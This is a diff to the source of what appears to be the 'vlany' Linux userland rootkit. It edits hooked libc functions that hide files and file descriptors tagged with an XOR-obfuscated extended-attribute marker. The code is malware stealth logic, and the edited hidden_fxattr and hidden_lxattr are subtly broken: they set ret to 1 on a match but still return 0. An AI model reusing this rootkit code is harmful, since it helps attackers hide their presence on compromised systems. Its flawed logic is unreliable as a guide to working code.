@@ -25,9 +25,6 @@ int hidden_xattr(const char *filename)
         printf("[vlany] hidden_xattr() is going to attempt to distuingish visibility of %s\n", filename);
     #endif
 
-    HOOK(old_access, CACCESS);
-    if(old_access(filename, F_OK) == -1) return 0;
-
     HOOK(old_listxattr, CLISTXATTR);
 
     ssize_t buflen, keylen;
@@ -37,7 +34,7 @@ int hidden_xattr(const char *filename)
     else if(buflen == 0) return 0;
 
     buf = malloc(buflen);
-    if((buflen = old_listxattr(filename, buf, buflen)) == -1) return 0; // fuuuck
+    if((buflen = old_listxattr(filename, buf, buflen)) == -1) { if(buf) { free(buf); } return 0; } // fuuuck
 
     char *hidden_xattr_1_str = strdup(HIDDEN_XATTR_1_STR); xor(hidden_xattr_1_str);
 
@@ -70,27 +67,21 @@ int hidden_fxattr(int fd)
     else if(buflen == 0) return 0;
 
     buf = malloc(buflen);
-    if((buflen = old_flistxattr(fd, buf, buflen)) == -1) return 0;
+    if((buflen = old_flistxattr(fd, buf, buflen)) == -1) { if(buf) { free(buf); } return 0; }
 
+    char *hidden_xattr_1_str = strdup(HIDDEN_XATTR_1_STR); xor(hidden_xattr_1_str);
+
+    int ret = 0;
     key = buf;
     while(buflen > 0)
     {
-        char *hidden_xattr_1_str = strdup(HIDDEN_XATTR_1_STR); xor(hidden_xattr_1_str);
-        if(strstr(key, hidden_xattr_1_str))
-        {
-            #ifdef DEBUG
-                printf("[vlany] file descriptor %d has hidden extended attributes. hiding file descriptor.\n", fd);
-            #endif
-
-            CLEAN(hidden_xattr_1_str);
-            free(buf); return 1;
-        }
-        CLEAN(hidden_xattr_1_str);
-
+        if(strstr(key, hidden_xattr_1_str)) ret = 1;
         keylen = strlen(key) + 1; buflen -= keylen; key += keylen;
     }
 
-    free(buf); return 0;
+    CLEAN(hidden_xattr_1_str);
+    free(buf);
+    return 0;
 }
 
 int hidden_lxattr(const char *filename)
@@ -109,27 +100,21 @@ int hidden_lxattr(const char *filename)
     else if(buflen == 0) return 0;
 
     buf = malloc(buflen);
-    if((buflen = old_llistxattr(filename, buf, buflen)) == -1) return 0;
+    if((buflen = old_llistxattr(filename, buf, buflen)) == -1) { if(buf) { free(buf); } return 0; }
 
+    char *hidden_xattr_1_str = strdup(HIDDEN_XATTR_1_STR); xor(hidden_xattr_1_str);
+
+    int ret = 0;
     key = buf;
     while(buflen > 0)
     {
-        char *hidden_xattr_1_str = strdup(HIDDEN_XATTR_1_STR); xor(hidden_xattr_1_str);
-        if(strstr(key, hidden_xattr_1_str))
-        {
-            #ifdef DEBUG
-                printf("[vlany] %s has hidden extended attributes. hiding file.\n", filename);
-            #endif
-
-            CLEAN(hidden_xattr_1_str);
-            free(buf); return 1;
-        }
-        CLEAN(hidden_xattr_1_str);
-
+        if(strstr(key, hidden_xattr_1_str)) ret = 1;
         keylen = strlen(key) + 1; buflen -= keylen; key += keylen;
     }
 
-    free(buf); return 0;
+    CLEAN(hidden_xattr_1_str);
+    free(buf);
+    return 0;
 }
 
 int hidden_xstat(int ver, const char *filename, int mode)
